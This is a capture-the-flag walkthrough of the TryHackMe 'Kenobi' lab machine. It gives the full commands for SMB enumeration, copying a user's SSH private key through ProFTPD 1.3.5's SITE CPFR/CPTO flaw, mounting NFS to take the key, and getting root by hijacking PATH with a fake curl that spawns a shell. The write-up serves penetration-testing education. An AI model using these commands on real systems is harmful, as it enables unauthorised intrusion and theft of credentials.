<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Kenobi TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/kenobi-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-08-10T16:40:32+00:00">August 10, 2021</time><time class="updated" datetime="2025-06-25T08:59:56+00:00">June 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Kenobi”. It is available at TryHackMe for penetration testing practice. The challenge is an easy difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The breakdown of the Machine with redacted flags is as follow:</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Connecting SMB Service</span></li>
<li><span style="color: #000000;">Acquiring Log File</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Searching for exploit using Searchsploit</span></li>
<li><span style="color: #000000;">Grabbing the Exploit Page</span></li>
<li><span style="color: #000000;">Connecting to FTP Service using netcat</span></li>
<li><span style="color: #000000;">Copying id_rsa file</span></li>
<li><span style="color: #000000;">Mounting the remote directory</span></li>
<li><span style="color: #000000;">Grabbing id_rsa file</span></li>
<li><span style="color: #000000;">Connecting SSH service</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating SUID Permissions</span></li>
<li><span style="color: #000000;">Enumerating Binary using strings</span></li>
<li><span style="color: #000000;">Creating malicious Curl</span></li>
<li><span style="color: #000000;">Adding malicious Curl in PATH</span></li>
<li><span style="color: #000000;">Running the Binary</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;">There are two flags in this machine to discover. After Booting up the target machine from the <a style="color: #000000;" href="https://tryhackme.com/room/kenobi">TryHackMe: Kenobi Page</a>, an IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.101.175</strong></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">We will start a Nmap scan with the -sV from performing a Version Scan and -sC for default scripts on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.10.101.175</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fiAfgwHbELM/YRKpsbkt_mI/AAAAAAAAyIA/TZGZwfyU1HMxVxyXUpNJ1coE-IUwAw-7gCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Now that we have five services running on the target machine. We have 21 (FTP), 22 (SSH), 80 (HTTP), 111 &amp; 2049 (RPC), 139 &amp; 445 (SMB).</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">To enumerate the SMB service, we will use the smbclient with the IP address of the target machine as shown in the image. We can see that there is a share by the name of anonymous. Upon accessing the share, we find a text file by the name of log.txt. We transfer the log file to our Kali machine to take a better look at it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L \\10.10.101.175
smbclient //10.10.101.175/anonymous
ls
get log.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YW9uMwqYc1M/YRKp5TgXoiI/AAAAAAAAyII/qeDqrwgPo-UzQ-bdwKBwNB-TZL-hllS1ACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Reading the log, we can see that it contains the path for the id_rsa key stored on the target machine. Also, it points to the fact that the FTP service running on the target machine is ProFTPD.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat log.txt</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Zzo_jGcQKqs/YRKpxyjR3QI/AAAAAAAAyIE/Uk3UekyFbgsaQX5QL6Q3QbK-TxpvzTXpwCLcBGAsYHQ/s16000/3.png"/></strong></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">As we need to get our hands on the id_rsa file and we see that we have the ProFTPD on the target, we need to figure out a way to get access to that file through the FTP service. To begin with, we check if we have any known vulnerabilities regarding the ProFTPD using Searchsploit. We see that we have the vulnerability named File Copy. Subsequently, we use the searchsploit to download the exploit file using the -m option. Here, we see that we need to run two significant commands: CPFR which means Copy From, and CPTO which means Copy To. Therefore, we can use these commands to copy the id_rsa file from its location to a place from where we can acquire it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit ProFTPD 1.3.5
searchsploit -m 36742
cat 36742.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fv3BVdRRGKg/YRKqGdVZrgI/AAAAAAAAyIM/DX5dalHWgMk5VPz0WWvPBbz2-rxd2u6kwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We used netcat to connect to the FTP service on the target machine. We used the CPFR command to copy the id_rsa from the home directory of the Kenobi user. Then we used the CPTO command to provide the destination address for the id_rsa file. We transferred the file to /var directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc 10.10.101.175 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TFWw4aeR7Es/YRKqQpmRgOI/AAAAAAAAyIU/ZkyCGJn7MIwyQcip7NPNpS_wlIiUVxxEwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Now that we have successfully transferred the id_rsa into the var directory, we can mount the /var directory so that we can access the id_rsa files on our local machine. We created a directory by the name of /ignite inside the /mnt directory. Next, we used the mount command to mount the remote var directory to our local ignite folder. Moving to the ignite directory we found the id_rsa file. Changing the permissions of the id_rsa file to make it ready to connect via SSH.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /mnt/ignite
mount 10.10.101.175:/var /mnt/ignite
cd /mnt/ignite/tmp
ls
cp id_rsa /root/
cd /root
chmod 600 id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O4M-gsWJEEE/YRKqXjxlf9I/AAAAAAAAyIc/Rd6ms_P1CXEKyb8pY84HdclnkSf2Zzm1ACLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">With the help of the id_rsa key, we were able to connect to the target machine as the Kenobi user. Here we were able to read the first flag by the name of user.txt.</span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Now that we have the session on the target machine and we have the user flag. Let’s move on to enumerating the permissions to figure out a way to elevate privileges. We used the find command to check for all the binaries with permissions and found /usr/bin/menu to not be usually found in Linux. It could be our way to root.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa kenobi@10.10.101.175
cat user.txt
find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--YMwezLZ-No/YRKqcISSe2I/AAAAAAAAyIg/dtPp4ztRCdcGU3OFCmHGrCnfsCf0ywy3ACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We ran the menu binary to see that it prints a menu with options such as status check, kernel version, and running ifconfig. We ran the kernel version and got version 4.80. Apparently, this binary must be running the command in the background to get these outputs. To understand better, we used the strings command to fetch all the human-readable snippets from the binary, and eventually, we found that it uses the curl command to get the localhost. Since it doesn’t mention the full path of curl, we can therefore create a malicious payload with the name curl and add it into the path. This will make the binary run our malicious file instead of the original curl.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/bin/menu
strings /usr/bin/menu</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4zwCyW0wYeg/YRKqgm9LTiI/AAAAAAAAyIo/29EgC7n7ApUGPxEpu9p1p1t-TO4UF0fBACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We moved to the tmp directory and created a binary invoking the /bin/sh and named it to curl. Then we changed the permission of the binary to be executable. At last, we added this curl into the local path using the export command. Now running the menu binary, we choose an option from the menu and we got ourselves the root shell. We read the root flag and conclude this machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
echo /bin/sh &gt; curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
Id
cat /root/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4_MSOMxiHpc/YRKqk096cQI/AAAAAAAAyIs/FrAkx3gV-bsXwk1re_UovY2QsOxzzgaTQCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on</span> <strong>Twitter</strong> and <strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
